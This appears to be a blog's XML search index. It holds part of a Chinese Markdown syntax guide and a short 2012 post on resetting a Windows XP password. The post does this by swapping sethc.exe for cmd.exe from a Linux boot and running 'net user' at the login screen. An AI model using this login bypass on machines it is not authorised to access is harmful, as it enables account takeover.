asterisks&lt;/em&gt;&lt;em&gt;single underscores&lt;/em&gt;&lt;strong&gt;double asterisks&lt;/strong&gt;&lt;strong&gt;double underscores&lt;/strong&gt;</code></pre><p>你可以随便用你喜欢的样式，唯一的限制是，你用什么符号开启标签，就要用什么符号结束。</p><p>强调也可以直接插在文字中间：</p><pre><code>un*frigging*believable</code></pre><p>但是<strong>如果你的 <code>*</code> 和 <code>_</code> 两边都有空白的话，它们就只会被当成普通的符号</strong>。</p><p>如果要在文字前后直接插入普通的星号或底线，你可以用反斜线：</p><pre><code>\*this text is surrounded by literal asterisks\*</code></pre><h3 id="code">代码</h3><p>如果要标记一小段行内代码，你可以用反引号把它包起来（<code>`</code>），例如：</p><pre><code>Use the `printf()` function.</code></pre><p>会产生：</p><pre><code>&lt;p&gt;Use the &lt;code&gt;printf()&lt;/code&gt; function.&lt;/p&gt;</code></pre><p>如果要在代码区段内插入反引号，你可以用多个反引号来开启和结束代码区段：</p><pre><code>``There is a literal backtick (`) here.``</code></pre><p>这段语法会产生：</p><pre><code>&lt;p&gt;&lt;code&gt;There is a literal backtick (`) here.&lt;/code&gt;&lt;/p&gt;</code></pre><p>代码区段的起始和结束端都可以放入一个空白，起始端后面一个，结束端前面一个，这样你就可以在区段的一开始就插入反引号：</p><pre><code>A single backtick in a code span: `` ` ``A backtick-delimited string in a code span: `` `foo` ``</code></pre><p>会产生：</p><pre><code>&lt;p&gt;A single backtick in a code span: &lt;code&gt;`&lt;/code&gt;&lt;/p&gt;&lt;p&gt;A backtick-delimited string in a code span: &lt;code&gt;`foo`&lt;/code&gt;&lt;/p&gt;</code></pre><p>在代码区段内，<code>&amp;</code> 和方括号<strong>都</strong>会被自动地转成 HTML 实体，这使得插入 HTML 原始码变得很容易，Markdown 会把下面这段：</p><pre><code>Please don&#39;t use any `&lt;blink&gt;` tags.</code></pre><p>转为：</p><pre><code>&lt;p&gt;Please don&#39;t use any &lt;code&gt;&amp;lt;blink&amp;gt;&lt;/code&gt; tags.&lt;/p&gt;</code></pre><p>你也可以这样写：</p><pre><code>`&amp;#8212;` is the decimal-encoded equivalent of `&amp;mdash;`.</code></pre><p>以产生：</p><pre><code>&lt;p&gt;&lt;code&gt;&amp;amp;#8212;&lt;/code&gt; is the decimal-encodedequivalent of &lt;code&gt;&amp;amp;mdash;&lt;/code&gt;.&lt;/p&gt;</code></pre><h3 id="img">图片</h3><p>很明显地，要在纯文字应用中设计一个「自然」的语法来插入图片是有一定难度的。</p><p>Markdown 使用一种和链接很相似的语法来标记图片，同样也允许两种样式： <em>行内式</em>和<em>参考式</em>。</p><p>行内式的图片语法看起来像是：</p><pre><code>![Alt text](/path/to/img.jpg)![Alt text](/path/to/img.jpg &quot;Optional title&quot;)</code></pre><p>详细叙述如下：</p><ul><li>一个惊叹号 <code>!</code></li><li>接着一个方括号，里面放上图片的替代文字</li><li>接着一个普通括号，里面放上图片的网址，最后还可以用引号包住并加上<br>选择性的 ‘title’ 文字。</li></ul><p>参考式的图片语法则长得像这样：</p><pre><code>![Alt text][id]</code></pre><p>「id」是图片参考的名称，图片参考的定义方式则和连结参考一样：</p><pre><code>[id]: url/to/image  &quot;Optional title attribute&quot;</code></pre><p>到目前为止， Markdown 还没有办法指定图片的宽高，如果你需要的话，你可以使用普通的 <code>&lt;img&gt;</code> 标签。</p><hr><h2 id="misc">其它</h2><h3 id="autolink">自动链接</h3><p>Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用方括号包起来， Markdown 就会自动把它转成链接。一般网址的链接文字就和链接地址一样，例如：</p><pre><code>&lt;http://example.com/&gt;</code></pre><p>Markdown 会转为：</p><pre><code>&lt;a href=&quot;http://example.com/&quot;&gt;http://example.com/&lt;/a&gt;</code></pre><p>邮址的自动链接也很类似，只是 Markdown 会先做一个编码转换的过程，把文字字符转成 16 进位码的 HTML 实体，这样的格式可以糊弄一些不好的邮址收集机器人，例如：</p><pre><code>&lt;address@example.com&gt;</code></pre><p>Markdown 会转成：</p><pre><code>&lt;a href=&quot;&amp;#x6D;&amp;#x61;i&amp;#x6C;&amp;#x74;&amp;#x6F;:&amp;#x61;&amp;#x64;&amp;#x64;&amp;#x72;&amp;#x65;&amp;#115;&amp;#115;&amp;#64;&amp;#101;&amp;#120;&amp;#x61;&amp;#109;&amp;#x70;&amp;#x6C;e&amp;#x2E;&amp;#99;&amp;#111;&amp;#109;&quot;&gt;&amp;#x61;&amp;#x64;&amp;#x64;&amp;#x72;&amp;#x65;&amp;#115;&amp;#115;&amp;#64;&amp;#101;&amp;#120;&amp;#x61;&amp;#109;&amp;#x70;&amp;#x6C;e&amp;#x2E;&amp;#99;&amp;#111;&amp;#109;&lt;/a&gt;</code></pre><p>在浏览器里面，这段字串（其实是 <code>&lt;a href=&quot;mailto:address@example.com&quot;&gt;address@example.com&lt;/a&gt;</code>）会变成一个可以点击的「<a href="mailto:&#x61;&#100;&#100;&#114;&#101;&#x73;&#x73;&#64;&#x65;&#x78;&#x61;&#109;&#112;&#x6c;&#101;&#x2e;&#99;&#x6f;&#109;">&#x61;&#100;&#100;&#114;&#101;&#x73;&#x73;&#64;&#x65;&#x78;&#x61;&#109;&#112;&#x6c;&#101;&#x2e;&#99;&#x6f;&#109;</a>」链接。</p><p>（这种作法虽然可以糊弄不少的机器人，但并不能全部挡下来，不过总比什么都不做好些。不管怎样，公开你的信箱终究会引来广告信件的。）</p><h3 id="backslash">反斜杠</h3><p>Markdown 可以利用反斜杠来插入一些在语法中有其它意义的符号，例如：如果你想要用星号加在文字旁边的方式来做出强调效果（但不用 <code>&lt;em&gt;</code> 标签），你可以在星号的前面加上反斜杠：</p><pre><code>\*literal asterisks\*</code></pre><p>Markdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：</p><pre><code>\   反斜线`   反引号*   星号_   底线&#123;&#125;  花括号[]  方括号()  括弧#   井字号+   加号-   减号.   英文句点!   惊叹号</code></pre><h2 id="acknowledgement">感谢</h2><p>感谢 <a href="https://twitter.com/#!/leafy7382">leafy7382</a> 协助翻译，<a href="http://iamhlb.com/">hlb</a>、<a href="http://twitter.com/randylien">Randylien</a> 帮忙润稿，<a href="https://twitter.com/#!/ethantw">ethantw</a> 的<a href="http://ethantw.net/projects/han/">汉字标准格式・CSS Reset</a>， <a href="http://kidwm.net/">WM</a> 回报文字错误。</p><p>感谢 <a href="https://github.com/fenprace">fenprace</a>，<a href="https://github.com/addv">addv</a>。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jekyll </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小试牛刀</title>
      <link href="/2012/03/15/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/"/>
      <url>/2012/03/15/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/</url>
      
        <content type="html"><![CDATA[<p><img src="/assets/images/www.lu.uestc.edu.cn.png"></p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用linux系统轻松破解xp系统密码</title>
      <link href="/2012/01/22/%E5%88%A9%E7%94%A8linux%E7%B3%BB%E7%BB%9F%E8%BD%BB%E6%9D%BE%E7%A0%B4%E8%A7%A3xp%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/"/>
      <url>/2012/01/22/%E5%88%A9%E7%94%A8linux%E7%B3%BB%E7%BB%9F%E8%BD%BB%E6%9D%BE%E7%A0%B4%E8%A7%A3xp%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>其实很简单的，因为在 linux 下能访问 xp 的文件系统。在 xp 的文件系统里面复制 system32 目录下的 cmd.exe 改名为 sethc.exe 将原来的那个 sethc.exe 替换了，然后启动 xp，到登陆的时候不停的按 shift 键，直到出现命令行窗口，然后在里面输入 net user yourUserName newPassword(例如 net user yuer yuercl，用户名 user 可以通过 net 命令的帮助获得)，然后回车就把密码改掉了，然后就可猥琐了。。。</p><p>今天，虚拟环境下亲测利用 ubuntu iso 镜像进入 ubuntu 系统，更改 Windows xp 文件，完美进入系统。。。</p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
